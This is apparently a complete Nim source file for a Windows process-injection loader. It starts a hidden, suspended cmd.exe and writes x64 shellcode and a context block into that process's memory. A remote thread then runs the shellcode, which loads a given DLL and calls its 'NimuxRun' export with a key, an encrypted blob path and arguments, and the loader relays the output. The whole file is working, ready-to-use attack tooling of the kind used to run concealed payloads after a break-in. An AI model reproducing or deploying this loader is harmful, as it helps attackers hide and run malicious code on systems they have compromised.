import std/[winlean, os, strutils]

type
  STARTUPINFOA {.pure.} = object
    cb, pad0: uint32
    lpReserved, lpDesktop, lpTitle: pointer
    dwX, dwY, dwXSize, dwYSize: uint32
    dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags: uint32
    wShowWindow, cbReserved2: uint16
    lpReserved2, hStdInput, hStdOutput, hStdError: pointer

  PROCESS_INFORMATION {.pure.} = object
    hProcess, hThread: Handle
    dwProcessId, dwThreadId: uint32

  SECURITY_ATTRIBUTES2 {.pure.} = object
    nLength: uint32
    lpSecurityDescriptor: pointer
    bInheritHandle: int32

const
  CREATE_SUSPENDED        = 0x00000004'u32
  CREATE_NO_WINDOW        = 0x08000000'u32
  MEM_COMMIT              = 0x00001000'u32
  MEM_RESERVE             = 0x00002000'u32
  PAGE_READWRITE          = 0x04'u32
  PAGE_EXEC_READ          = 0x20'u32
  STARTF_USESTDHANDLES    = 0x00000100'u32
  HANDLE_FLAG_INHERIT     = 0x00000001'u32
  STD_OUTPUT_HANDLE       = cast[uint32](-11'i32)

proc createProcessA(app, cmd: cstring; pa, ta: pointer; inherit: int32;
                    flags: uint32; env, dir: pointer;
                    si: ptr STARTUPINFOA; pi: ptr PROCESS_INFORMATION): int32
  {.stdcall, dynlib: "kernel32", importc: "CreateProcessA".}
proc virtualAllocEx(h: Handle; a: pointer; s: int; t, p: uint32): pointer
  {.stdcall, dynlib: "kernel32", importc: "VirtualAllocEx".}
proc writeProcessMemory(h: Handle; a, buf: pointer; s: int; wr: ptr int): int32
  {.stdcall, dynlib: "kernel32", importc: "WriteProcessMemory".}
proc virtualProtectEx(h: Handle; a: pointer; s: int; p: uint32; old: ptr uint32): int32
  {.stdcall, dynlib: "kernel32", importc: "VirtualProtectEx".}
proc createRemoteThread(h: Handle; a: pointer; s: int; fn, param: pointer;
                        flags: uint32; tid: ptr uint32): Handle
  {.stdcall, dynlib: "kernel32", importc: "CreateRemoteThread".}
proc waitForSingleObject(h: Handle; ms: uint32): uint32
  {.stdcall, dynlib: "kernel32", importc: "WaitForSingleObject".}
proc closeHandle(h: Handle): int32
  {.stdcall, dynlib: "kernel32", importc: "CloseHandle".}
proc terminateProcess(h: Handle; code: uint32): int32
  {.stdcall, dynlib: "kernel32", importc: "TerminateProcess".}
proc getModuleHandleA(n: cstring): pointer
  {.stdcall, dynlib: "kernel32", importc: "GetModuleHandleA".}
proc getProcAddress(h: pointer; n: cstring): pointer
  {.stdcall, dynlib: "kernel32", importc: "GetProcAddress".}
proc createPipe(rd, wr: ptr Handle; sa: ptr SECURITY_ATTRIBUTES2; size: uint32): int32
  {.stdcall, dynlib: "kernel32", importc: "CreatePipe".}
proc setHandleInformation(h: Handle; mask, flags: uint32): int32
  {.stdcall, dynlib: "kernel32", importc: "SetHandleInformation".}
proc readFileWin(h: Handle; buf: pointer; n: uint32; rd: ptr uint32; ov: pointer): int32
  {.stdcall, dynlib: "kernel32", importc: "ReadFile".}
proc writeFileWin(h: Handle; buf: pointer; n: uint32; wr: ptr uint32; ov: pointer): int32
  {.stdcall, dynlib: "kernel32", importc: "WriteFile".}
proc getStdHandle(n: uint32): Handle
  {.stdcall, dynlib: "kernel32", importc: "GetStdHandle".}
proc getExitCodeThread(h: Handle; code: ptr uint32): int32
  {.stdcall, dynlib: "kernel32", importc: "GetExitCodeThread".}

type RunArgs {.pure.} = object
  keyHex:    array[256, char]
  blobPath:  array[520, char]
  argsBuf:   array[8192, char]
  argsCount: int32

type BootstrapCtx {.pure.} = object
  loadLibraryA:   pointer
  getProcAddress: pointer
  dllPathAddr:    pointer
  funcNameAddr:   pointer
  runArgsAddr:    pointer

const bootstrap: array[62, uint8] = [
  0x48'u8, 0x83, 0xec, 0x38,
  0x48, 0x89, 0x4c, 0x24, 0x30,
  0x48, 0x8b, 0x01,
  0x48, 0x8b, 0x49, 0x10,
  0xff, 0xd0,
  0x48, 0x85, 0xc0,
  0x74, 0x22,
  0x48, 0x89, 0xc1,
  0x48, 0x8b, 0x44, 0x24, 0x30,
  0x48, 0x8b, 0x50, 0x18,
  0x48, 0x8b, 0x40, 0x08,
  0xff, 0xd0,
  0x48, 0x85, 0xc0,
  0x74, 0x0b,
  0x48, 0x8b, 0x4c, 0x24, 0x30,
  0x48, 0x8b, 0x49, 0x20,
  0xff, 0xd0,
  0x48, 0x83, 0xc4, 0x38,
  0xc3
]

proc injectAndRun(dllPath, keyHex, blobPath: string; asmArgs: seq[string]): int =
  var sa: SECURITY_ATTRIBUTES2
  sa.nLength = uint32(sizeof(SECURITY_ATTRIBUTES2))
  sa.bInheritHandle = 1
  var rdPipe, wrPipe: Handle
  if createPipe(addr rdPipe, addr wrPipe, addr sa, 0) == 0:
    return 3
  discard setHandleInformation(rdPipe, HANDLE_FLAG_INHERIT, 0)

  let windir = getEnv("SystemRoot", "C:\\Windows")
  let target = windir & "\\System32\\cmd.exe"

  var si: STARTUPINFOA
  si.cb         = uint32(sizeof(STARTUPINFOA))
  si.dwFlags    = STARTF_USESTDHANDLES
  si.hStdInput  = nil
  si.hStdOutput = cast[pointer](wrPipe)
  si.hStdError  = cast[pointer](wrPipe)
  var pi: PROCESS_INFORMATION

  if createProcessA(target.cstring, nil, nil, nil, 1'i32,
                    CREATE_SUSPENDED or CREATE_NO_WINDOW,
                    nil, nil, addr si, addr pi) == 0:
    discard closeHandle(rdPipe); discard closeHandle(wrPipe); return 4
  discard closeHandle(wrPipe)

  let hProc = pi.hProcess
  let k32           = getModuleHandleA("kernel32.dll")
  let loadLibAddr   = getProcAddress(k32, "LoadLibraryA")
  let getProcAddr   = getProcAddress(k32, "GetProcAddress")
  if loadLibAddr == nil or getProcAddr == nil:
    discard terminateProcess(hProc, 1); discard closeHandle(rdPipe); return 5

  let funcName  = "NimuxRun"
  let totalSize = bootstrap.len +
                  sizeof(BootstrapCtx) +
                  dllPath.len + 1 +
                  funcName.len + 1 +
                  sizeof(RunArgs)

  let remote = virtualAllocEx(hProc, nil, totalSize,
                              MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if remote == nil:
    discard terminateProcess(hProc, 1); discard closeHandle(rdPipe); return 6

  let base        = cast[int](remote)
  let ctxOff      = bootstrap.len
  let dllPathOff  = ctxOff + sizeof(BootstrapCtx)
  let funcNameOff = dllPathOff + dllPath.len + 1
  let argsOff     = funcNameOff + funcName.len + 1

  var ctx: BootstrapCtx
  ctx.loadLibraryA   = loadLibAddr
  ctx.getProcAddress = getProcAddr
  ctx.dllPathAddr    = cast[pointer](base + dllPathOff)
  ctx.funcNameAddr   = cast[pointer](base + funcNameOff)
  ctx.runArgsAddr    = cast[pointer](base + argsOff)

  var args: RunArgs
  zeroMem(addr args, sizeof(RunArgs))
  copyMem(addr args.keyHex[0], unsafeAddr keyHex[0], min(keyHex.len, 255))
  copyMem(addr args.blobPath[0], unsafeAddr blobPath[0], min(blobPath.len, 519))
  args.argsCount = int32(asmArgs.len)
  var pos = 0
  for s in asmArgs:
    if s.len == 0 or pos + s.len + 1 >= args.argsBuf.len: break
    copyMem(addr args.argsBuf[pos], unsafeAddr s[0], s.len)
    pos += s.len + 1

  var written: int
  var bootstrapBuf = bootstrap
  if writeProcessMemory(hProc, remote, addr bootstrapBuf[0],
                        bootstrap.len, addr written) == 0 or
     writeProcessMemory(hProc, cast[pointer](base + ctxOff),
                        addr ctx, sizeof(BootstrapCtx), addr written) == 0 or
     writeProcessMemory(hProc, cast[pointer](base + dllPathOff),
                        unsafeAddr dllPath[0], dllPath.len + 1, addr written) == 0 or
     writeProcessMemory(hProc, cast[pointer](base + funcNameOff),
                        unsafeAddr funcName[0], funcName.len + 1, addr written) == 0 or
     writeProcessMemory(hProc, cast[pointer](base + argsOff),
                        addr args, sizeof(RunArgs), addr written) == 0:
    discard terminateProcess(hProc, 1); discard closeHandle(rdPipe); return 7

  var old: uint32
  if virtualProtectEx(hProc, remote, bootstrap.len, PAGE_EXEC_READ, addr old) == 0:
    discard terminateProcess(hProc, 1); discard closeHandle(rdPipe); return 8

  let thr = createRemoteThread(hProc, nil, 0, remote,
                               cast[pointer](base + ctxOff), 0, nil)
  if thr == 0:
    discard terminateProcess(hProc, 1); discard closeHandle(rdPipe); return 9

  discard waitForSingleObject(thr, 300_000)
  discard closeHandle(thr)
  discard closeHandle(pi.hThread)

  let exitProc = getProcAddress(k32, "ExitProcess")
  if exitProc != nil:
    let exitThr = createRemoteThread(hProc, nil, 0, exitProc, nil, 0, nil)
    if exitThr != 0:
      discard waitForSingleObject(hProc, 10_000)
      discard closeHandle(exitThr)
    else:
      discard terminateProcess(hProc, 0)
  else:
    discard terminateProcess(hProc, 0)
  discard closeHandle(hProc)

  var buf: array[4096, char]
  var nRead: uint32
  let stdOut = getStdHandle(STD_OUTPUT_HANDLE)
  while readFileWin(rdPipe, addr buf[0], uint32(buf.len), addr nRead, nil) != 0 and nRead > 0:
    discard writeFileWin(stdOut, addr buf[0], nRead, addr nRead, nil)
  discard closeHandle(rdPipe)
  0

when isMainModule:
  if paramCount() < 3: quit(1)
  let dllPath  = paramStr(1)
  let keyHex   = paramStr(2)
  let blobPath = paramStr(3)
  var asmArgs: seq[string]
  for i in 4 .. paramCount(): asmArgs.add paramStr(i)
  let code = injectAndRun(dllPath, keyHex, blobPath, asmArgs)
  if code != 0: quit(code)
